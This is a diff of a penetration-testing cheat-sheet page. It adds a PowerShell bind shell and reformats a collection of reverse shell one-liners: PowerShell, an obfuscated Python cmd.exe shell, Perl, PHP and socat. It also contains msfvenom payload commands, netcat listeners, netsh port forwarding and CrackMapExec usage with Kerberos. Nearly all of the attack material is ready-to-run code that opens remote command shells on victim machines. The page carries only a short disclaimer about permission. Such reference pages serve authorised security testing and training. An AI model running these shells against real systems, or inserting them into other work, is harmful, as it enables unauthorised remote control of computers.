@@ -3,14 +3,25 @@
 {% hint style="success" %}
 Hack Responsibly.
 
-Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
 {% endhint %}
 
 Not much here yet...please feel free to contribute at [https://www.github.com/zweilosec](https://github.com/zweilosec)
 
+## **Bind Shell**
+
+PowerShell bind shell one-liner to set up shell listener.  Need to customize port on listener.
+
+```powershell
+#Listener on victim machine
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$port);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+#Connect to listener with nc or similar
+nc -nv $ip $port
+```
+
 ## **Reverse Shells**
 
-TODO: description and methodology for each section \(as needed\); Fix code examples so they can be used for scripting
+TODO: description and methodology for each section (as needed); Fix code examples so they can be used for scripting
 
 ### **PowerShell Reverse Shells**
 
@@ -22,7 +33,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sock
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-* Need to customize the variables `$ip` and `$port` 
+* Need to customize the variables `$ip` and `$port`
 
 ### **Python Reverse Shells**
 
@@ -30,7 +41,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ip',$por
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect((ipAddress, port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 
-* The variables `ipAddress` and `port` need to be customized.  `ipAddress` must be a string, `port` must be an integer.
+* The variables `ipAddress` and `port` need to be customized. `ipAddress` must be a string, `port` must be an integer.
 
 ### Ruby Reverse Shells
 
@@ -48,7 +59,7 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$ip:$port");STDIN->fdopen($c,r);
 perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
 ```
 
-* The variables `$ip` and `$port` need to be customized.  `$ip` must be a string, `$port` must be an integer.
+* The variables `$ip` and `$port` need to be customized. `$ip` must be a string, `$port` must be an integer.
 
 ### **PHP Reverse Shell**
 
@@ -81,35 +92,35 @@ $output = system($cmd);
 
 * **Windows Non-Staged reverse TCP**
 
-```text
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reversetcp.exe
 ```
 
 * **Windows Staged reverse TCP**
 
-```text
+```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reversetcp.exe
 ```
 
 ## Improving Windows Reverse Shells
 
-Usually, after catching a reverse shell from a Windows machine through netcat you already have a shell that has full functionality. However, on occasion your shell is limited in some ways that can be truly annoying.  The features I miss the most are command history (and using the 'up' and 'down' arrows to cycle through them) and tab autocompletion.  It can feel quite disorienting working in a shell that is missing these vital features.
- 
-Options for upgrading Windows reverse shells are more limited than they are coming from a Linux machine.  
+Usually, after catching a reverse shell from a Windows machine through netcat you already have a shell that has full functionality. However, on occasion your shell is limited in some ways that can be truly annoying. The features I miss the most are command history (and using the 'up' and 'down' arrows to cycle through them) and tab autocompletion. It can feel quite disorienting working in a shell that is missing these vital features.
+
+Options for upgrading Windows reverse shells are more limited than they are coming from a Linux machine.
 
 ### rlwrap
 
-You can mitigate some of the restrictions of poor netcat shells by wrapping the netcat listener with the `rlwrap` command.  This is not installed in Kali Linux by default so you will need to install it using the command `sudo apt install rlwrap -y`.  Other distributions may or may not have this installed or available in their package manager.
+You can mitigate some of the restrictions of poor netcat shells by wrapping the netcat listener with the `rlwrap` command. This is not installed in Kali Linux by default so you will need to install it using the command `sudo apt install rlwrap -y`. Other distributions may or may not have this installed or available in their package manager.
 
 ```bash
 rlwrap nc -lvnp $port
 ```
 
-Start your netcat listener by first prefixing it with the `rlwrap` command, then specifying the port to listen on.  Your shell will automatically be a bit more stable than running netcat by itself.
+Start your netcat listener by first prefixing it with the `rlwrap` command, then specifying the port to listen on. Your shell will automatically be a bit more stable than running netcat by itself.
 
-### socat 
+### socat
 
-Another powerful tool that can be used to get functional shells, do port forwarding, and much more is [`socat`](http://www.dest-unreach.org/socat/).  (Windows version: [https://github.com/3ndG4me/socat](https://github.com/3ndG4me/socat))
+Another powerful tool that can be used to get functional shells, do port forwarding, and much more is [`socat`](http://www.dest-unreach.org/socat/). (Windows version: [https://github.com/3ndG4me/socat](https://github.com/3ndG4me/socat))
 
 1. From your attack platform create a listener
 
@@ -117,9 +128,8 @@ Another powerful tool that can be used to get functional shells, do port forward
 socat TCP4-LISTEN:$port,fork STDOUT
 ```
 
-2. Upload to or compile `socat.exe` on the Windows victim machine.
-
-3. On the Windows victim create the reverse shell back to your waiting listener.
+1. Upload to or compile `socat.exe` on the Windows victim machine.
+2. On the Windows victim create the reverse shell back to your waiting listener.
 
 ```bash
 socat.exe TCP4:$ip:$port EXEC:'cmd.exe',pipes
@@ -127,12 +137,11 @@ socat.exe TCP4:$ip:$port EXEC:'cmd.exe',pipes
 
 ### meterpreter
 
-Another method of upgrading the functionality of a Windows reverse shell that I know is to create a reverse shell payload that calls a `meterpreter` interactive shell.  This shell interacts with the Metasploit Framework to provide additional functionality such as uploading and downloading files, attempting to elevate privileges to System, and more.
-
+Another method of upgrading the functionality of a Windows reverse shell that I know is to create a reverse shell payload that calls a `meterpreter` interactive shell. This shell interacts with the Metasploit Framework to provide additional functionality such as uploading and downloading files, attempting to elevate privileges to System, and more.
 
 ## netsh port forwarding
 
-```text
+```
 netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=9000 connectaddress=192.168.0.10 connectport=80
 netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=9000
 ```
@@ -146,7 +155,7 @@ TODO: is this enumeration, access, or privesc?
 
 To use against a specific protocol run `cme $protocol $options`
 
-```text
+```
 available protocols
 
   {http,smb,mssql}
@@ -157,22 +166,22 @@ available protocols
 
 ### Using Kerberos
 
-CME supports Kerberos authentication using the `--kerberos` flag.  You must also export the `KRB5CCNAME` environment variable to specify the ticket.  You can get this ticket using Impacket's `GetTGT.py`.
+CME supports Kerberos authentication using the `--kerberos` flag. You must also export the `KRB5CCNAME` environment variable to specify the ticket. You can get this ticket using Impacket's `GetTGT.py`.
 
 {% hint style="info" %}
-When using the option **`--kerberos`**, you must specify the same hostname \(FQDN\) as the one from the Kerberos ticket.
+When using the option **`--kerberos`**, you must specify the same hostname (FQDN) as the one from the Kerberos ticket.
 {% endhint %}
 
-```text
+```
 export KRB5CCNAME=/path/to/user@domain.ccache 
 cme smb $domain --kerberos
 ```
 
 ### Use CME against an IPv6 address
 
-Using SSH tunnel on the local host.  For best results save the ipv6 address to `/etc/hosts` and use the hostname instead.
+Using SSH tunnel on the local host. For best results save the ipv6 address to `/etc/hosts` and use the hostname instead.
 
-```text
+```
 ssh user@localhost -L 445:[IPV6]:445
 
 crackmapexec smb localhost
@@ -185,4 +194,3 @@ CME also supports modules, such as mimikatz
 * [https://mpgn.gitbook.io/crackmapexec/getting-started/using-modules](https://mpgn.gitbook.io/crackmapexec/getting-started/using-modules)
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
-
